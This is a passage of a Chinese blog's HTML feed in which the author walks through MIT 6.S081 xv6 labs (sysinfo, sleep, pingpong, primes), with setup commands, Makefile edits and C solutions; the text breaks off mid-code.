class="string">&quot;sysinfo.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sysinfo</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">sysinfo</span>;</span></span><br><span class="line">    uint64 dst;                 <span class="comment">// user pointer to struct sysinfo</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(argaddr(<span class="number">0</span>, &amp;dst) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    sysinfo.freemem = kfreemem();</span><br><span class="line">    sysinfo.nproc = nproc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(copyout(p-&gt;pagetable, dst, (<span class="type">char</span>*)&amp;sysinfo, <span class="keyword">sizeof</span>(sysinfo)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=sysinfo grade</span><br></pre></td></tr></table></figure><br><img src="sysinfo实验结果.png" alt="sysinfo实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xv6</title>
      <link href="/2022/05/19/xv6/"/>
      <url>/2022/05/19/xv6/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大名鼎鼎的MIT的<strong><a href="https://pdos.csail.mit.edu/6.828/2020/">6.828</a></strong>课程<br>看了课程提供的<a href="https://www.youtube.com/watch?v=tc4ROCJYbm0">视频</a>，瞬间心潮澎湃<br>希望可以通过这门课程，加深对于操作系统方面的理解</p><h1 id="Lab-Utilities"><a href="#Lab-Utilities" class="headerlink" title="Lab Utilities"></a>Lab Utilities</h1><p>本次<a href="https://pdos.csail.mit.edu/6.828/2020/labs/util.html">lab</a>帮助熟悉<strong>xv6</strong>操作系统</p><h2 id="Boot-xv6"><a href="#Boot-xv6" class="headerlink" title="Boot xv6"></a>Boot xv6</h2><p>在Linux的终端中，执行如下命令，安装相关依赖<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu </span><br></pre></td></tr></table></figure></p><p>执行如下命令，拉取<strong>xv6</strong>仓库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@gitee.com:jiaweihawk/mit-6.S081.git</span><br></pre></td></tr></table></figure></p><p>执行如下命令，拉取<strong>gdb</strong>并编译<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install libgmp-dev libncurses5-dev \</span><br><span class="line">  &amp;&amp; wget http://mirrors.aliyun.com/gnu/gdb/gdb-12.1.tar.gz\</span><br><span class="line">  &amp;&amp; tar -zxvf gdb-12.1.tar.gz\</span><br><span class="line">  &amp;&amp; <span class="built_in">cd</span> gdb-12.1\</span><br><span class="line">  &amp;&amp; ./configure --enable-tui=<span class="built_in">yes</span> --target=riscv64\</span><br><span class="line">  &amp;&amp; make -j $(<span class="built_in">nproc</span>)\</span><br><span class="line">  &amp;&amp; <span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure></p><p>执行如下命令，切换到<strong>util</strong>分支<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout util</span><br></pre></td></tr></table></figure></p><p>在终端中执行如下命令，启动<strong>qemu</strong>模拟器，并加载运行xv6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make qemu</span><br></pre></td></tr></table></figure></p><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Implement the UNIX program <strong>sleep</strong> for xv6; your <strong>sleep</strong> should pause for a user-specified number of ticks. A tick is a notion of time defined by the xv6 kernel, namely the time between two interrupts from the timer chip. Your solution should be in the file <strong>user/sleep.c</strong>.</p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>实际上，根据实验指南的说明<br>通过调用相关的系统调用，即可完成<strong>sleep</strong>程序的要求<br>需要注意的是，当完成或发现异常时，通过<strong>exit</strong>系统调用，完成进程的最终退出即可</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>在Makefile中添加该用户态程序目标，如下所示<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">$U/_cat\</span><br><span class="line">$U/_echo\</span><br><span class="line">$U/_forktest\</span><br><span class="line">$U/_grep\</span><br><span class="line">$U/_init\</span><br><span class="line">$U/_kill\</span><br><span class="line">$U/_ln\</span><br><span class="line">$U/_ls\</span><br><span class="line">$U/_mkdir\</span><br><span class="line">$U/_rm\</span><br><span class="line">$U/_sh\</span><br><span class="line">$U/_sleep\</span><br><span class="line">$U/_stressfs\</span><br><span class="line">$U/_usertests\</span><br><span class="line">$U/_grind\</span><br><span class="line">$U/_wc\</span><br><span class="line">$U/_zombie\</span><br></pre></td></tr></table></figure></p><p>再在<strong>user/</strong>目录下，创建<strong>sleep.c</strong>文件，仿照<strong>user/echo.c</strong>文件，添加相关的头文件，完成对<strong>sleep</strong>系统调用的包装。代码如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> time = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc &lt;= <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;usage: sleep time...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  time = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">  sleep(time);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=<span class="built_in">sleep</span> grade</span><br></pre></td></tr></table></figure><br><img src="sleep实验结果.png" alt="sleep实验结果"></p><h2 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h2><h3 id="要求-1"><a href="#要求-1" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Write a program that uses UNIX system calls to ‘’ping-pong’’ a byte between two processes over a pair of pipes, one for each direction. The parent should send a byte to the child; the child should print “<pid>: received ping”, where <pid> is its process ID, write the byte on the pipe to the parent, and exit; the parent should read the byte from the child, print “<pid>: received pong”, and exit. Your solution should be in the file <strong>user/pingpong.c</strong>.</p></blockquote><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>根据实验指南的说明<br>通过<strong>fork</strong>、<strong>pipe</strong>和<strong>getpid</strong>系统调用，即可完成<strong>pingpong</strong>程序的要求</p><p>这里根据实验手册，需要明确两点</p><ol><li><strong>fork</strong>在父进程中的返回值是pid，在子进程中的返回值是0</li><li><strong>pipe</strong>初始化的管道，其数组的第一个元素是读端，第二个元素是写端</li></ol><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>在Makefile中添加该用户态程序目标，如下所示<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">$U/_cat\</span><br><span class="line">$U/_echo\</span><br><span class="line">$U/_forktest\</span><br><span class="line">$U/_grep\</span><br><span class="line">$U/_init\</span><br><span class="line">$U/_kill\</span><br><span class="line">$U/_ln\</span><br><span class="line">$U/_ls\</span><br><span class="line">$U/_mkdir\</span><br><span class="line">$U/_pingpong\</span><br><span class="line">$U/_rm\</span><br><span class="line">$U/_sh\</span><br><span class="line">$U/_sleep\</span><br><span class="line">$U/_stressfs\</span><br><span class="line">$U/_usertests\</span><br><span class="line">$U/_grind\</span><br><span class="line">$U/_wc\</span><br><span class="line">$U/_zombie\</span><br></pre></td></tr></table></figure></p><p>再在<strong>user/</strong>目录下，创建<strong>pingpong.c</strong>文件，仿照<strong>user/sleep.c</strong>文件，添加相关的头文件，完成管道创建和读写。相关代码如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 初始化子进程的文件描述符信息</span></span><br><span class="line"><span class="comment"> * 关闭父进程写管道的写端</span></span><br><span class="line"><span class="comment"> * 关闭父进程读管道的读端</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 从而子进程从父进程写管道中读取数据</span></span><br><span class="line"><span class="comment"> * 向父进程读管道中写入数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">prepare_child_fds</span><span class="params">(<span class="type">int</span> *parent_write_p, <span class="type">int</span> *parent_read_p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//关闭父进程写管道的写段</span></span><br><span class="line">    close(parent_write_p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//关闭父进程读管道的读端</span></span><br><span class="line">    close(parent_read_p[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 初始化父进程的文件描述符信息</span></span><br><span class="line"><span class="comment"> * 关闭父进程写管道的读端</span></span><br><span class="line"><span class="comment"> * 关闭父进程读管道的写端</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 从而进程向父进程写管道中写入数据</span></span><br><span class="line"><span class="comment"> * 从父进程读管道中读出数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">prepare_parent_fds</span><span class="params">(<span class="type">int</span> *parent_write_p, <span class="type">int</span> *parent_read_p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//关闭父进程写管道的读段</span></span><br><span class="line">    close(parent_write_p[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//关闭父进程读管道的写端</span></span><br><span class="line">    close(parent_read_p[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> parent_write_p[<span class="number">2</span>], parent_read_p[<span class="number">2</span>];</span><br><span class="line">    <span class="type">char</span> byte = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化管道</span></span><br><span class="line">    pipe(parent_write_p);</span><br><span class="line">    pipe(parent_read_p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fork() == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在子进程中</span></span><br><span class="line">        prepare_child_fds(parent_write_p, parent_read_p);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从写管道中读出数据</span></span><br><span class="line">        read(parent_write_p[<span class="number">0</span>], &amp;byte, <span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 输出相应信息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: received ping\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向读管道中写入数据</span></span><br><span class="line">        write(parent_read_p[<span class="number">1</span>], &amp;byte, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在父进程中</span></span><br><span class="line">        prepare_parent_fds(parent_write_p, parent_read_p);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向写管道中写入数据</span></span><br><span class="line">        write(parent_write_p[<span class="number">1</span>], &amp;byte, <span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//从读管道中读入数据</span></span><br><span class="line">        read(parent_read_p[<span class="number">0</span>], &amp;byte, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出相应信息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>, getpid());</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//等待子进程正常退出后，父进程退出</span></span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//确保子进程和父进程正常退出</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=pingpong grade</span><br></pre></td></tr></table></figure><br><img src="pingpong实验结果.png" alt="pingpong实验结果"></p><h2 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h2><h3 id="要求-2"><a href="#要求-2" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Write a concurrent version of prime sieve using pipes. This idea is due to Doug McIlroy, inventor of Unix pipes. The picture halfway down <a href="https://swtch.com/~rsc/thread/">this page</a> and the surrounding text explain how to do it. Your solution should be in the file <strong>user/primes.c</strong>.</p></blockquote><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>根据实验指南可知，<strong>CSP</strong>模型描述了一个如下图所示进程链<br><img src="进程链.png" alt="进程链"></p><p>其每个进程从进程链中上一个元素接受输入，输出确定的质数，并将剩余的可能的质数输出到进程链的下一个元素。</p><p>由于<strong>fork</strong>系统调用的特性，可以抽象一个<strong>worker</strong>模型，来描述进程链的每一个元素。</p><p><strong>worker</strong>模型有如下特点</p><ul><li>其标准输入被覆盖为父进程(进程链的上一个元素)的管道写端</li><li>其会创建另一个<strong>worker</strong>，作为其子进程</li></ul><p>而<strong>worker</strong>模型的实现也很容易，其第一个特点是由上一个<strong>worker</strong>实现的，而<strong>worker</strong>模型实际上要实现的就是——其可以创建一个子进程，该子进程的标准输入被覆盖为管道的写端，并且子进程会接着执行<strong>worker</strong>执行流</p><p>在直白一些，就是有一个<strong>worker</strong>函数，该函数会<strong>fork</strong>一个子进程，子进程初始化相关的文件描述符后，继续执行<strong>worker</strong>函数即可</p><p>唯一要考虑的就是，如何构造第一个<strong>worker</strong>和最后一个<strong>worker</strong>元素，这里特殊处理一下就行</p><h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><p>在Makefile中添加该用户态程序目标，如下所示<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">$U/_cat\</span><br><span class="line">$U/_echo\</span><br><span class="line">$U/_forktest\</span><br><span class="line">$U/_grep\</span><br><span class="line">$U/_init\</span><br><span class="line">$U/_kill\</span><br><span class="line">$U/_ln\</span><br><span class="line">$U/_ls\</span><br><span class="line">$U/_mkdir\</span><br><span class="line">$U/_pingpong\</span><br><span class="line">$U/_primes\</span><br><span class="line">$U/_rm\</span><br><span class="line">$U/_sh\</span><br><span class="line">$U/_sleep\</span><br><span class="line">$U/_stressfs\</span><br><span class="line">$U/_usertests\</span><br><span class="line">$U/_grind\</span><br><span class="line">$U/_wc\</span><br><span class="line">$U/_zombie\</span><br></pre></td></tr></table></figure></p><p>再在<strong>user/</strong>目录下，创建<strong>primes.c</strong>文件，仿照<strong>user/echo.c</strong>文件，添加相关的头文件，完成<strong>worker</strong>模型的实现。代码如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> <span class="type">bool</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true    1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false   0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 初始化子进程的文件描述符</span></span><br><span class="line"><span class="comment"> * 关闭管道符的写端</span></span><br><span class="line"><span class="comment"> * 将管道符的读端覆盖进程的标准输入描述符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">prepare_child_fds</span><span class="params">(<span class="type">int</span> *pipefd)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//关闭管道符的写端</span></span><br><span class="line">    close(pipefd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//覆盖标准输入</span></span><br><span class="line">    close(<span class="number">0</span>);</span><br><span class="line">    dup(pipefd[<span class="number">0</span>]);</span><br><span class="line">    close(pipefd[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * worker子线程</span></span><br><span class="line"><span class="comment"> * 其从被覆盖的标准输入中读取候选数据</span></span><br><span class="line"><span class="comment"> * 并将可能的素数传递给子进程</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果其从父进程中读入了n个数(n &gt;= 1)</span></span><br><span class="line"><span class="comment"> * 第一个数是要输出的素数</span></span><br><span class="line"><span class="comment"> * 第2到n个数，如果是可能的质数(非第一个数的倍数)，则传递给子进程即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">worker</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> prime = <span class="number">0</span>, number, pipefd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">bool</span> has_forked = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//从父进程中读入第一个素数</span></span><br><span class="line">    read(<span class="number">0</span>, &amp;prime, <span class="keyword">sizeof</span>(prime));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prime %d\n&quot;</span>, prime);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//开始将后续的可能质数传递给子进程</span></span><br><span class="line">    <span class="keyword">while</span>(read(<span class="number">0</span>, &amp;number, <span class="keyword">sizeof</span>(number)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(number % prime) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// number为可能的质数</span></span><br><span class="line">            <span class="comment">// 将该数字传递给子进程</span></span><br><span class="line">            <span class="keyword">if</span>(!has_forked) &#123;</span><br><span class="line"></span><br><span class="line">                pipe(pipefd);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(fork() == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//在子进程中</span></span><br><span class="line">                    prepare_child_fds(pipefd);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//子进程继续执行worker工作即可</span></span><br><span class="line">                    worker();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//关闭管道符的读端</span></span><br><span class="line">                close(pipefd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//初始化子进程</span></span><br><span class="line">                has_forked = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            write(pipefd[<span class="number">1</span>], &amp;number, <span class="keyword">sizeof</span>(number));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//此时worker的工作基本做完</span></span><br><span class="line">    <span class="comment">//关闭管道符的写端，从而通知子进程已经没有数据</span></span><br><span class="line">    close(pipefd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果有子进程，则等待子进程退出即可</span></span><br><span class="line">    <span class="keyword">if</span>(has_forked)</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//结束进程即可</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pipefd[<span class="number">2</span>];    </span><br><span class="line"></span><br><span class="line">    pipe(pipefd);</span><br><span class="line"></span><br><span class="line">    <span 